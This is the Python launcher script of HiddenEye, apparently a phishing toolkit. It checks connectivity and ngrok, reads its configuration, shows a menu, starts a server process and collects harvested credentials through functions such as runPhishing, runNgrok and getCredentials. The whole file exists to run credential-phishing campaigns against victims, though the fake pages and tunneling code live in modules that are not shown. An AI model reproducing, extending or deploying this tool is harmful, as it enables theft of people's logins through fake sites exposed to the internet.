#HiddenEye by Open Source Community
import os
from time import sleep
from sys import stdout, exit, argv
from os import system, path
from distutils.dir_util import copy_tree
import multiprocessing
from urllib.request import urlopen, quote, unquote
from platform import system as systemos, architecture
from wget import download
import re
import json
from subprocess import check_output
from Defs.Checks import checkConnection, checkNgrok
from Defs.Configurations import createConfig, readConfig, ifSettingsNotExists
from Defs.Actions import runPhishing, selectServer, runNgrok, runServeo, runMainMenu, inputCustom, runServer, endMessage, getCredentials, writeLog



RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

checkConnection()
checkNgrok()

ifSettingsNotExists()
readConfig()
config = readConfig()


if __name__ == "__main__":
    try:
        runMainMenu()

        inputCustom()
        ##############
        selectServer()

        multiprocessing.Process(target=runServer).start()
        getCredentials()

    except KeyboardInterrupt:
        endMessage()
        exit(0)
